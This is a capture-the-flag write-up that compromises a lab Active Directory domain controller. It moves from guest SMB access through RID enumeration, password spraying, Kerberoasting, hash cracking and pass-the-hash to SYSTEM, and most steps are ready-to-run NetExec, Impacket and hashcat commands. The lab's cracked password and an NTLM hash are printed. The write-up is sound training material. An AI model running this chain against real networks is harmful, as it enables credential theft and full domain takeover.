# Soupedecode 01 – Full Write-Up

**Attack Path: SMB → RID Brute → Kerberoasting → Pass-the-Hash → SYSTEM**

---

## 1. Reconnaissance

### Port Scan

An initial Nmap scan revealed services typical of an **Active Directory Domain Controller**.

Key services identified:

* **53/tcp** – DNS
* **88/tcp, 464/tcp** – Kerberos
* **389/tcp, 636/tcp** – LDAP
* **445/tcp** – SMB
* **3268/tcp, 3269/tcp** – Global Catalog
* **3389/tcp** – RDP

This strongly indicated:

* Windows Server
* Domain Controller
* Active Directory environment

---

## 2. SMB Enumeration (Guest Access)

### Anonymous / Guest Authentication

SMB allowed **guest authentication** with an empty password.

```bash
nxc smb soupdecode.local -u guest -p ''
```

This confirmed:

* Guest access enabled
* IPC$ share accessible

---

## 3. RID Brute Force (User Enumeration)

Since IPC$ was accessible, **RID brute forcing** was possible.

```bash
nxc smb soupdecode.local -u guest -p '' --rid
```

This enumerated:

* Normal domain users
* Service accounts
* Machine accounts (`$`)

Examples:

```
SOUPEDECODE\ybob317
SOUPEDECODE\file_svc
SOUPEDECODE\backup_svc
SOUPEDECODE\FileServer$
```

### Creating a Clean User List

```bash
cat rid.txt | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | grep -v '\$' > users.txt
```

This produced a list of **human users only**.

---

## 4. Password Spray (Username = Password)

A low-noise password spray was performed using:

* Username as password
* No brute forcing
* Continue on success

```bash
nxc smb soupdecode.local -u users.txt -p users.txt --no-brute --continue-on-success
```

### Result

Valid credentials discovered:

```
ybob317 : ybob317
```

---

## 5. User Flag Access (SMB)

### Accessing the Users Share

```bash
smbclient //soupdecode.local/Users -U ybob317
```

Navigating to:

```
\ybob317\Desktop\
```

User flag retrieved:

```
user.txt
```

---

## 6. Kerberoasting (Service Account Abuse)

With valid domain credentials, **Kerberoasting** was possible.

```bash
python3 /usr/local/bin/GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.82.154.20 -request
```

Service accounts with SPNs were identified:

* `file_svc`
* `backup_svc`
* `web_svc`
* `monitoring_svc`

TGS hashes were dumped.

---

## 7. Offline Cracking (Hashcat)

Only the **file_svc** hash was crackable.

```bash
hashcat -m 13100 file_svc.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 file_svc.hash --show
```

### Result

```
file_svc : Password123!!
```

---

## 8. Privileged SMB Access (file_svc)

```bash
nxc smb soupdecode.local -u file_svc -p 'Password123!!' --shares
```

The **backup** share was now readable.

```bash
smbclient //soupdecode.local/backup -U file_svc
```

Downloaded:

```
backup_extract.txt
```

---

## 9. Credential Dump from Backup

Contents revealed **NTLM hashes for machine accounts**:

```
FileServer$:e41da7e79a4c76dbd9cf79d1cb325559
```

---

## 10. Pass-the-Hash (Machine Account)

Machine accounts often have **high privileges** when misconfigured.

### Using smbexec with IP only

```bash
python3 /usr/local/bin/smbexec.py 'SOUPEDECODE/FileServer$@10.82.154.20' \
-hashes aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559
```

Notes:

* `$` had to be quoted to avoid shell expansion
* Full `LM:NT` hash format required
* IP used to bypass DNS issues

---

## 11. SYSTEM Access Achieved

Successful execution resulted in:

```
NT AUTHORITY\SYSTEM
```

---

## 12. Root Flag

`smbexec` does not support directory persistence, so absolute paths were required.

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Root flag retrieved successfully.

---

## Attack Chain Summary

```
Guest SMB
 → RID brute force
 → Password spray
 → User access
 → Kerberoasting
 → Cracked service account
 → Backup share access
 → Machine NTLM hashes
 → Pass-the-Hash
 → SYSTEM on Domain Controller
```

---

## Key Misconfigurations Exploited

* Guest SMB access enabled
* RID enumeration allowed
* Weak user password
* Kerberoastable service account
* Plaintext credential backup
* Over-privileged machine account

---

## Tools Used

* nmap
* NetExec (nxc)
* smbclient
* Impacket (GetUserSPNs, smbexec)
* hashcat

---

## Final Outcome

✔ Domain Controller compromised
✔ SYSTEM privileges obtained
✔ Root flag captured

